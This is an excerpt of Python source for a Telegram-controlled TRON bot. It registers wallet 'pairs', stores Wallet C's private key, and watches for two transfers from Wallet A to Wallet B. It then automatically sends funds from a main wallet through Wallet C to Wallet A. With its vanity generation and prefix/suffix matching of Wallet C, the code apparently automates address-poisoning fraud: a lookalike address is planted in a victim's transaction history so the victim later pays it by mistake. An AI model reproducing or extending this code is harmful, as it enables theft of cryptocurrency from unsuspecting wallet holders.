...
def cmd_manual_pair(parts):
    """Register an existing A/B/C pair and immediately start monitoring."""
    log.info("Command received: manual")

    if len(parts) != 4:
        send_telegram(
            "❌ Usage: <code>manual [wallet_a] [wallet_b] [wallet_c]</code>\n\n"
            "This uses existing Wallet A, B and C without vanity generation.\n"
            "Wallet C must be controlled by the bot. Its private key is never accepted through Telegram; "
            "use a previously generated C or the GitHub Actions secret <code>MANUAL_WALLET_C_PRIVATE_KEY</code>."
        )
        return
    ...
    try:
        tron_base58_to_hex(wallet_a)
        tron_base58_to_hex(wallet_b)
        tron_base58_to_hex(wallet_c)
    except Exception:
        send_telegram("❌ One or more supplied wallets is not a valid TRON address.")
        return

    existing = db.execute(
        "SELECT * FROM execution_queue WHERE wallet_c_address = ? "
        "AND wallet_c_private_key IS NOT NULL AND wallet_c_private_key != '' "
        "ORDER BY id DESC LIMIT 1",
        (wallet_c,),
    ).fetchone()

    c_private_key = (
        existing["wallet_c_private_key"]
        if existing else MANUAL_WALLET_C_PRIVATE_KEY.strip()
    )

    if not c_private_key:
        send_telegram(
            "❌ Wallet C is not available to the bot.\n\n"
            "Do not send its private key in Telegram. Add it as the GitHub Actions secret "
            "<code>MANUAL_WALLET_C_PRIVATE_KEY</code>, restart the action, then use the manual command again."
        )
        return

    try:
        from tronpy.keys import PrivateKey
        c_priv = PrivateKey(bytes.fromhex(c_private_key.replace("0x", "").replace(" ", "")))
        derived_c = c_priv.public_key.to_base58check_address()
    except Exception:
        send_telegram("❌ The configured Wallet C private key is invalid.")
        return

    if derived_c != wallet_c:
        send_telegram("❌ Wallet C does not match the configured Wallet C private key. No pair was created.")
        return

    now = datetime.now(timezone.utc).isoformat()
    cursor = db.execute(
        "INSERT INTO execution_queue "
        "(wallet_a, wallet_b, wallet_c_address, wallet_c_private_key, prefix_match, suffix_match, created_at, status) "
        "VALUES (?, ?, ?, ?, 0, 0, ?, 'approved')",
        (wallet_a, wallet_b, wallet_c, c_private_key, now),
    )
    pair_id = cursor.lastrowid
    ...
    log.info("Manual Pair #%s registered; monitoring %s -> %s with C=%s", pair_id, wallet_a, wallet_b, wallet_c)
    send_telegram(
        f"✅ <b>MANUAL PAIR REGISTERED — Pair #{pair_id}</b>\n\n"
        f"<b>Wallet A:</b> <code>{wallet_a}</code>\n"
        f"<b>Wallet B:</b> <code>{wallet_b}</code>\n"
        f"<b>Wallet C:</b> <code>{wallet_c}</code>\n\n"
        f"👀 Monitoring A → B now.\n"
        f"The bot waits for <b>2 confirmed TRX transfers from A to B within 40 minutes</b>.\n"
        f"The <b>second transfer</b> triggers <b>Main → Wallet C → Wallet A</b> automatically."
    )
...
def main():
    ...
    if not send_telegram(
        ...
        "Use /add to generate Wallet C, or /manual to supply an existing A/B/C pair.\n"
